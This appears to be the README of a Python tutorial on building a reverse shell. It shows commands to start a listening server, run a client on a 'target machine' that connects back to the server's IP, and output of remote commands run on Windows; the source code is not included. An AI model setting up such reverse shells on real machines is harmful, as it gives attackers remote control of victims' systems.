# [How to Create a Reverse Shell in Python](https://www.thepythoncode.com/article/create-reverse-shell-python)
You don't need to install anything.
- To run the server, simply write:
    ```
    python server.py
    ```
    **Output:**
    ```
    Listening as 0.0.0.0:5003 ...
    ```
- Running the client (target machine) that connects to 192.168.1.104 (server's IP Address) :
    ```
    python client.py 192.168.1.104
    ```
    **Output:**
    ```
    Server: Hello and Welcome
    ```
- The server will get notified once a client is connected, executing `dir` command on Windows remotely (in `server.py`):
    ```
    192.168.1.103:58428 Connected!
    Enter the command you wanna execute:dir
    Volume in drive E is DATA
    Volume Serial Number is 644B-A12C

    Directory of E:\test

    09/24/2019  02:15 PM    <DIR>          .
    09/24/2019  02:15 PM    <DIR>          ..
                0 File(s)              0 bytes
                2 Dir(s)  89,655,123,968 bytes free
    Enter the command you wanna execute:exit
    ```
